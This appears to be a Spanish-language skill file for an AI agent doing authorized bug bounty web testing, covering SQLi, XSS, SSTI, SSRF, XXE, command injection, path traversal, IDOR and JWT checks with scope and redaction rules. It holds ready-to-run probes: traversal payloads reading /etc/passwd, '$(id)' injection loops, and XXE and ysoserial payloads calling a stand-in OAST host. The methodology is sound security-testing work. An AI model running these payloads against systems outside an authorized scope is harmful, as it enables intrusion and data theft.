---
name: bb-webapp
description: >-
  Use this skill to test web applications in an authorized bug bounty scope:
  parameter mapping, injection classes (SQLi, XSS, SSTI, XXE, SSRF, command
  injection, path traversal), broken access control (IDOR/BOLA), auth and session
  flaws, business logic, race conditions, file upload, GraphQL, client-side secret
  exposure, security headers, and Burp-driven methodology. Load it when the target
  surface is a web application.
---

# bb-webapp / Aplicacion Web

Checklist operativo de superficie web. Prioriza por impacto, usa la herramienta mas
leve que responda la pregunta, y valida cada hallazgo manualmente antes de
reportarlo.

## 0. Preparacion del proxy

Todo lo manual pasa por un proxy para poder repetir las peticiones:
- **Burp Suite Community** (BlackArch `blackarch-webapp`) o **mitmproxy** (pipx).
- Configura un scope de Burp que solo incluya los activos in-scope. Es la
  proteccion mas importante: un Burp mal configurado scannea internet.
- Guardalo: `~/.config/burp` o `~/.mitmproxy`.
- En mobile testing: `mitmproxy` con CA instalada en el dispositivo.

```bash
# mitmproxy en modo headless con filtro de scope
mitmproxy --mode regular --listen-port 8080 --set block_global=true --save-stream-file flows.mitm
# burpsuite headless (community no lo soporta igual): usa mitmproxy + Burp extension
```

## 1. Recon del target

```bash
# MapearUrls y parametros
katana -u https://$HOST -d 3 -jc -kf all -xlsx -o urls.csv
arjun -u https://$HOST -m GET,POST --stable -oJ arjun.json
gospider -s https://$HOST -d 3 -c 10 --js -o gospider.txt
# Parametros historicos
gau --subs --providers https://$HOST | sort -u > gau.txt
# Enfocar endpoints con parametros
grep -E '\?[^ ]+=' gau.txt | sort -u > endpoints_params.txt
```

Construye una tabla: URL | metodo | parametros | requiere auth | tecnologia.

## 2. Injection

### SQLi
```bash
# sqlmap - nivel 1, riesgo 1 (no destructivo por defecto)
sqlmap -u "https://$HOST/path?id=1" --batch --level=1 --risk=1 --technique=BEUSTQ \
  --threads=3 --timeout=15 --retries=1 --output-dir=sqlmap_out --flush-session

# Con sesion autenticada: exporta la cookie/header desde Burp
sqlmap -u "https://$HOST/path?id=1" --cookie="session=..." --headers="X-CSRF-Token:..." \
  --batch --level=2 --risk=1 --technique=BEUSTQ

# Verificacion manual: compara respuesta con y sin comilla, con time-based
curl -s "https://$HOST/path?id=1'" -o /dev/null -w '%{http_code} %{size_download}\n'
curl -s "https://$HOST/path?id=1"  -o /dev/null -w '%{http_code} %{size_download}\n'
```

Criterios: confirma con (a) respuesta distinta, (b) marcador booleano, (c) diferencia
de tiempo reproducible, (d) evidencia del motor. No reportes solo el mensaje de
error de la app: eso es a veces un "error de sintaxis" generico. Usa `--string`
con un valor aleatorio tuyo para confirmar coincidencia exacta.

Nunca uses `--dump`, `--os-shell`, `--sql-shell` salvo autorizacion escrita.
Reporta con el **impacto**: si solo puedes demostrar extraccion de una fila de
una tabla propia de prueba, dilo honestamente.

### XSS
```bash
# dalfox (BlackArch blackarch-webapp)
dalfox url "https://$HOST/search?q=1" --silence --no-color --skip-bav
dalfox file urls.txt --silence --format json --output dalfox.json
dalfox url "https://$HOST/?q=1" --blind --callback yourdomain.com
# xsser
xsser -u "https://$HOST/?q=1" -p "FUZZ"
```

Impacto real: self-XSS no cuenta; XSS reflejado sin victimas = bajo; XSS
almacenado que se ejecuta en el panel de un admin = critico. Verifica si hay
sesion privilegiada afectada.

### SSTI
```bash
# Probe de templates: {{7*7}}, ${7*7}, <%= 7*7 %>, #{7*7}
for p in '{{7*7}}' '${7*7}' '<%= 7*7 %>' '#{7*7}' '{{7*\'7\'}}'; do
  curl -s "https://$HOST/?q=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$p")" \
    | grep -oE '49' && echo " -> posible SSTI: $p"
done
# Jinja2/SSTI en python
python3 -c "
import requests
for tpl in ['{{7*7}}','{{config}}','{{self.__class__}}']:
    r=requests.get('https://$HOST/?q='+tpl,timeout=10)
    if '49' in r.text or 'Config' in r.text: print('HIT',tpl,r.status_code)
"
```

### SSRF
```bash
# Usa tu propio collaborator OOB (Interactsh / oastify / requestbin)
# interactsh-client
interactsh-client -json -o oob.json &
interactsh-client -json > /dev/null 2>&1 &
curl -s "http://$HOST/fetch?url=http://$(interactsh-client -s).oast.fun"
# Prueba SSRF solo contra objetivos no internos
```
Nunca apuntes a IPs internas del cliente, ni a `169.254.169.254` de una cuenta
nube ajena, ni a servicios del propio provider (salvo que el asset este en
scope y documentado).

### XXE
```bash
# Payload de ejemplo en un parametro XML (solo si el input es XML)
curl -s -X POST "https://$HOST/api" -H "Content-Type: application/xml" -d '<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY xxe SYSTEM "http://YOUR_OAST/xxe">]><r>&xxe;</r>'
```
Prefiere OOB: demuestra la XXE sin leer archivos.

### Command injection
```bash
for p in ';' '&&' '|' '$(id)' '`id`' '\nid'; do
  code=$(curl -s -o /dev/null -w '%{http_code} %{size_download}' "https://$HOST/ping?host=127.0.0.1$p")
  echo "$p -> $code"
done
# commix
commix -u "https://$HOST/ping?host=127.0.0.1" --batch --level=2 --skip-technique=o
```

### Path traversal / LFI
```bash
for p in "../../../../etc/passwd" "....//....//etc/passwd" "%2e%2e%2f%2e%2e%2fetc%2fpasswd" \
         "..%2f..%2f..%2f..%2fetc%2fpasswd" "....\....\....\....\etc\passwd"; do
  curl -s "https://$HOST/download?file=$p" | head -3
done
```

### Deserializacion
```bash
# ysoserial para Java; dotnet tool
java -jar ysoserial-all.jar <gadget-chain> "http://YOUR_OAST/" > payload.bin
# Solo si hay una instancia de prueba. Nunca contra produccion con datos reales.
```

## 3. Broken Access Control (IDOR / BOLA)

Es la clase mas rentable en bounty. Metodo:

```bash
# 1. Identifica el objeto
curl -s "https://$HOST/api/v1/users/me" -H "Authorization: Bearer $TOKEN_A" | jq .

# 2. Cambia SOLO el identificador, manteniendo tu sesion
curl -s "https://$HOST/api/v1/users/1002" -H "Authorization: Bearer $TOKEN_A" | jq .

# 3. Confirma que el dato es de OTRO usuario (compara un campo visible)
# 4. Confirma que no hay IDOR en el otro sentido (tu sesion no puede leer a otros)
```

Matriz de prueba (con dos cuentas **propias** o cuentas de test del programa):

| Patron | Prueba | Severidad tipica |
|---|---|---|
| `GET /api/v1/orders/{id}` | Cambia id numerico | High si expone PII |
| `PUT /api/v1/users/{id}` | Cambia id | Critical si permite escalar rol |
| `DELETE /api/v1/item/{id}` | Cambia id | High |
| `GET /api/v1/orders/{id}/invoice` | Cambia id | High |
| GraphQL `node(id:)` | Cambia el id global | High |
| GraphQL `user(id:)` | Cambia id | High |
| Archivos estaticos `/{uuid}` | Cambia uuid | Medium/High |
| Webhooks `/{uuid}` | Cambia uuid | Medium |
| Parametro `?userId=`, `?accountId=`, `?orgId=` | Cambia valor | High |

Variantes a no olvidar:
- **Inyeccion de IDOR en cabeceras**: `X-User-Id`, `X-Tenant-Id`, `X-Forwarded-For` con IP de otro tenant.
- **Inyeccion en el cuerpo**: `"userId": 1002`.
- **Mass assignment**: anadir `"role":"admin"` o `"isAdmin":true` en un PUT/POST.
- **Verb tampering**: `GET` vs `POST` vs `PUT` vs `DELETE` vs `PATCH` vs `HEAD` vs `OPTIONS`.
- **Cambio de metodo**: `X-HTTP-Method-Override`.
- **Doble encoding / unicode** en IDs.

Documenta el impacto con **un** registro ajeno y redactado. Nunca vuelques el
registro completo en el reporte.

## 4. Autenticacion y sesion

- Password reset: token predecible? (`/reset?token=<base64 of user id + timestamp>`), host header injection en el enlace, response leakage del token.
- MFA bypass: cambio de endpoint tras completar MFA, rate limit del OTP, OTP reutilizable.
- Session fixation, cookie flags (`Secure`, `HttpOnly`, `SameSite`), JWT (`alg: none`, `kid` injection, HS/RS confusion, JWKS `jwk` substitution, missing expiry, `aud`/`iss` no validados).
- OAuth/OIDC: redirect_uri abierto, `state` ausente, account takeover via deep link, referer leakage del code.
- Token leakage: en URL (query params), en logs, en Referer, en localStorage, en JWT payload, en respuestas de error, en S3 publico.

```bash
# JWT: decodificar y auditar
echo "$JWT" | cut -d. -f2 | base64 -d 2>/dev/null | jq .
# jwt_tool
python3 jwt_tool.py -t "$JWT" -C -d wordlist/jwt_common.txt
```

## 5. Race conditions

```bash
# Concepto: dos peticiones concurrentes sobre el mismo recurso
# Burst con curl en paralelo
for i in $(seq 1 10); do
  curl -s -X POST "https://$HOST/api/coupon/redeem" -H "Authorization: Bearer $TOKEN_A" \
    -d '{"code":"SINGLEUSE"}' -o /dev/null -w "%{http_code}\n" &
done; wait
```
Solo en recursos de prueba. Si el programa prohibe load testing, limita a un
numero minimo de peticiones concurrentes (2-5) y explica el objetivo.

## 6. File upload

- Sube un archivo con extension no ejecutable y contenido controlado (`file.txt` con `<?php echo 'X'; ?>`).
- Verifica: se renombra? cambia de content-type? se sirve ejecutable? el path es publicly accessible?
- Verifica double extension (`shell.php.jpg`), null byte, path traversal en el nombre (`../../`), MIME sniffing.
- Sube a tu propio bucket y valida. Elimina despues (ver `bb-opsec`).

## 7. Client-side

```bash
# Secrets en JS
curl -s "https://$HOST/static/app.js" | grep -oE '(apiKey|api_key|secret|token|password|aws_access_key_id|sk_live|pk_live|ghp_)[^"'"'"']{0,80}'
# localStorage / sessionStorage expuestos
# Source maps: /static/app.js.map -> recuperar y buscar endpoints internos
# CSP, HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy
curl -sSI https://$HOST | grep -iE 'content-security-policy|strict-transport|x-frame|x-content-type|referrer-policy'
```

Secrets en JS son **informativo o medio** salvo que den acceso real. Verifica.

## 8. Nuclei como acelerador (no como fuente de findings)

```bash
nuclei -l hosts_http.txt -t vulnerabilities/ -severity medium,high,critical \
  -c 5 -rl 10 -timeout 10 -retries 1 -o nuclei_web.txt
# Templates muy utiles: exposures/, misconfig/, cves/2024/, default-logins/
# Validar SIEMPRE manualmente. Nuclei produce falsos positivosspectaculares.
```

## 9. Blue team (defensa derivable del finding)

Cada finding web debe sugiere una deteccion o un control. Ejemplos:
- IDOR -> authz check en cada endpoint con object reference (OWASP API1).
- SQLi -> WAF rule + parametrized queries + logging de SQL errors.
- SSRF -> egress allowlist + IMDSv2 + metadata protection.
- Secret exposure -> secret scanning en CI + rotacion.

Detalle en `bb-blue`.

## 10. Plantilla de finding

```
Titulo: <Clase> en <endpoint> permite <impacto>
Severidad: CVSS v3.1 vector + justificacion de negocio
Asset: host + path
CWE: CWE-639 (Authorization Bypass Through User-Controlled Key)
Precondiciones: usuario autenticado nivel <X> / no autenticado
Impacto: <que obtiene el atacante y por que importa al negocio>
Pasos: 1..N reproducibles con curl/requests
PoC: <script>
Evidencia: findings/F-00X/evidence/...
Fix: <remediacion concreta> + fix de defesa en profundidad
Retest: <como se valida la correccion>
```

## 11. Errores que matan un bounty report

- Reportar un "posible" sin evidencia de impacto.
- Reportar algo que no es in-scope (servidor de terceros, CDN).
- Reportar el mismo bug en 40 subdominios como 40 findings: agrupa.
- Reportar un scan de nuclei sin verificar.
- Reportar "user enumeration" sin impacto.
- Reportar algo que el programa excluye explicitamente (DoS, headers sin impacto, self-XSS).
- Exponer PII real en las capturas: redacta SIEMPRE.
